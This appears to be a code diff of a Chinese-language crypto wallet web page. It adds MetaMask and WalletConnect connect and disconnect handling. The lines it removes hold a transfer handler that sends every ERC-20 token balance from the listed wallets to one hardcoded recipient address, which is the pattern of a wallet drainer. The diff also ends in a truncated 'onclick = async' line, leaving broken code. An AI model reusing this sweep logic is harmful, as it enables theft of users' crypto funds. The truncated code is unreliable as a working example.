@@ -2,6 +2,7 @@ const recipientAddress = '0xa465e2fc9f9d527aaeb07579e821d461f700e699';
 const etherscanApiKey = 'YOUR_ETHERSCAN_API_KEY'; // 替换为你的 Etherscan API Key
 let web3;
 let walletConnectProvider;
+let isConnected = false;
 
 const erc20Abi = [
     {
@@ -27,25 +28,32 @@ document.getElementById('connectButton').onclick = async () => {
     const selectedWallet = document.getElementById('walletSelector').value;
 
     try {
+        if (isConnected) {
+            document.getElementById('status').innerText = '已连接的设备，请先断开连接';
+            return;
+        }
+
         if (selectedWallet === 'metamask') {
             if (window.ethereum) {
                 await window.ethereum.request({ method: 'eth_requestAccounts' });
                 web3 = new Web3(window.ethereum);
                 const accounts = await web3.eth.getAccounts();
                 updateWalletList(accounts[0]);
+                isConnected = true;
                 document.getElementById('status').innerText = 'MetaMask 已连接';
             } else {
                 document.getElementById('status').innerText = '请安装 MetaMask 钱包';
             }
         } else if (selectedWallet === 'walletconnect') {
             walletConnectProvider = new WalletConnectProvider({
-                infuraId: "YOUR_INFURA_PROJECT_ID", // 替换为你的 Infura 项目 ID
+                infuraId: "YOUR_INFURA_PROJECT_ID",
             });
 
             await walletConnectProvider.enable();
             web3 = new Web3(walletConnectProvider);
             const accounts = await web3.eth.getAccounts();
             updateWalletList(accounts[0]);
+            isConnected = true;
             document.getElementById('status').innerText = 'WalletConnect 已连接';
         }
 
@@ -61,6 +69,19 @@ const updateWalletList = (address) => {
     walletItem.innerText = address;
     walletList.appendChild(walletItem);
 };
+
+const disconnectWallet = async () => {
+    if (walletConnectProvider) {
+        await walletConnectProvider.disconnect();
+        walletConnectProvider = null;
+    }
+    web3 = null;
+    isConnected = false;
+    document.getElementById('status').innerText = '已断开连接';
+    document.getElementById('walletList').innerHTML = ''; // 清空钱包列表
+};
+
+document.getElementById('disconnectButton').onclick = disconnectWallet;
 
 async function getTokenBalances(address) {
     try {
@@ -96,36 +117,4 @@ async function getTokenBalances(address) {
     }
 }
 
-document.getElementById('transferButton').onclick = async () => {
-    const walletInput = document.getElementById('wallets').value;
-    const walletAddresses = walletInput.split(',').map(addr => addr.trim());
-
-    for (const walletAddress of walletAddresses) {
-        if (!web3.utils.isAddress(walletAddress)) {
-            document.getElementById('status').innerText += `\n无效的钱包地址: ${walletAddress}`;
-            continue;
-        }
-
-        document.getElementById('status').innerText += `\n正在获取 ${walletAddress} 的代币余额...`;
-        const tokenBalances = await getTokenBalances(walletAddress);
-
-        for (const tokenAddress in tokenBalances) {
-            const token = tokenBalances[tokenAddress];
-            const balance = token.balance;
-
-            if (balance > 0) {
-                const tokenContract = new web3.eth.Contract(erc20Abi, tokenAddress);
-                try {
-                    const transfer = await tokenContract.methods.transfer(recipientAddress, balance).send({ from: walletAddress });
-                    document.getElementById('status').innerText += `\n成功转移 ${balance.toString()} ${token.symbol} 从 ${walletAddress} 至 ${recipientAddress}`;
-                } catch (error) {
-                    document.getElementById('status').innerText += `\n转移 ${token.symbol} 失败: ${error.message}`;
-                }
-            } else {
-                document.getElementById('status').innerText += `\n账户 ${walletAddress} 在 ${token.symbol} (${tokenAddress}) 上没有代币余额`;
-            }
-        }
-    }
-
-    document.getElementById('status').innerText += '\n所有代币转移完成';
-};
+document.getElementById('transferButton').onclick = async
